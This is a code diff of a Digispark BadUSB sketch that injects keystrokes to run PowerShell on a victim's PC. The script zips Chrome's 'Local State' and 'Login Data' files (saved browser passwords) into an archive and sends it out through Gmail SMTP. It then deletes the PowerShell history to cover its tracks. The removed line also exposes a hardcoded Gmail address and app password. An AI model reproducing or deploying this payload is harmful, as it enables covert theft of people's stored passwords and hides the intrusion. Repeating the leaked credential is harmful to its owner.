@@ -21,19 +21,12 @@ void setup() {
   DigiKeyboard.print(F("Compress-Archive -Path './temp/' -DestinationPath $env:USERPROFILE'/senhas.zip'"));
   DigiKeyboard.delay(400);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('edu.netgaming@gmail.com', 'ikxoyglfyihpwixq'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'edu.netgaming@gmail.com'; $ReportEmail.To.Add('edu.netgaming@gmail.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Digispark report'; $ReportEmail.Attachments.Add('senhas.zip'); $SMTPInfo.Send($ReportEmail)"));
+  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR EMAIL', 'YOUR PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUR EMAIL'; $ReportEmail.To.Add('TARGET EMAIL'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Digispark report'; $ReportEmail.Attachments.Add('senhas.zip'); $SMTPInfo.Send($ReportEmail)"));
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  
-  // cd $env:USERPROFILE
-  // mkdir temp
-  //
-  // copy $env:USERPROFILE'/AppData/Local/Google/Chrome/User Data/Local State' $env:USERPROFILE'/temp'
-  // copy $env:USERPROFILE'/AppData/Local/Google/Chrome/User Data/Default/Login Data' $env:USERPROFILE'/temp'
-  // Compress-Archive -Path '.\temp\' -DestinationPath $env:USERPROFILE'/senhas.zip'
  }
 
 // the loop routine runs over and over again forever:
